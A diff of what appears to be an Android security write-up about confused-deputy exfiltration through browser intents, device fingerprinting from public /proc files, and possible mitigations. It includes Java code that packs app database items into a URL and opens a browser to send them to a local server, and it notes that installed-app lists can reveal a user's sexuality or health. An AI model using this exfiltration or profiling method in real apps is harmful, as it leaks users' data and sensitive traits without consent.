@@ -7,27 +7,23 @@ First, we need to setup a web server. Here, it is a localhost server
 running on port 3001, so its address is `10.0.2.2:3001` on the emulated
 device.
 
-Then, we populate the database on the app:
-
-![Database content](./assets/database_content_p1.png)
-
 When we want to exfiltrate the data, we just have to create an intent to
 open our server webpage with GET parameters, like
-`http://10.0.2.2:3001/?secret1=abc&secret2=def`.
+`http://10.0.2.2:3001/?key1=secret1&key2=secret2`.
 
-In our example, the server received this:
-
-![Server request](./assets/server_request_p1.png)
-
-This data is accessible by the app because it is its own data, and thus
-does not break sandboxing. It would be quite different for other kind
-of data though, since file system access require specific permissions
-and user interaction, and other apps database content are protected from
-access by other app thanks to sandboxing. It should however not be
-possible to send this data to a webserver through internet, since the
-app doesn't use the Internet permission, but by using a third-party app
-we can manage to exfiltrate this data. This kind of situation correspond
-to a confused deputy problem.
+By default, without any permissions it seems like there are not many
+ways to get informations about the user. However, using some public
+Android APIs or Linux files, a lot of informations can be extracted. For
+example, the list of all installed packages is public, and while this
+seems harmless it can give hints about the user's sexuality (if Grindr
+or other specific dating apps are installed), its health if some diabete
+or weight loss apps are found, etc. Some informations can also be found
+in Linux files, like the CPU model or the amount of RAM to get the
+device model, or some network informations. Some of these files and
+directories are `/sys/class/net/`, `/proc/net/tpc`, `/proc/net/arp`,
+`/proc/cpuinfo`, `/proc/meminfo`, etc. These files are accessible by
+anyone due to the nature of Android, being based on a Linux kernel.
+Finally, commands like `ps` can expose running tasks.
 
 On android and iOS, apps are sandboxed and heavily restricted, as
 opposed to desktop apps. If an app wants to access a private resource
@@ -60,10 +56,10 @@ should be noted however that, first, the data accessible is only our own
 data, which limits the damages possible, and that this method isn't very
 discreet, as the user clearly sees its browser opening.
 
-The code used is the following one:
+The code used is the following one to exfiltrate the data:
 
 ```java
-// This will be our URL like http://10.0.2.2:3001/?secret1=abc&secret2=def
+// This will be our URL like http://10.0.2.2:3001/?key1=secret1&key2=secret2
 StringBuilder evilRequest = new StringBuilder("/?");
 for (Item item : mItemsData) {
 	// Add each item to the exfiltration URL
@@ -83,6 +79,10 @@ if (intent.resolveActivity(getPackageManager()) != null) {
 	startActivity(intent);
 }
 ```
+
+The database's content looks like, for example:
+
+![Database content](./assets/database_content_p1.png)
 
 # 2 - Malicious intents
 
@@ -173,6 +173,14 @@ break A even though it doesn't use it.
 The solution above could also be completed using a stacktrace of chained
 events, to avoid the confused app B to send a third intent that will
 look legitimate for the third (or same) app.
+
+Some Linux files that currently are public shouldn't be anymore on
+Android, and should be then restricted.
+
+It could be argued that the list of all applications could also be set
+to private at the Android API level, and the ability to execute system
+commands like `ls` or `cat` through `Runtime.getRuntime().exec`
+completely removed.
 
 ## 3.2 - Against data leak: part 2
 
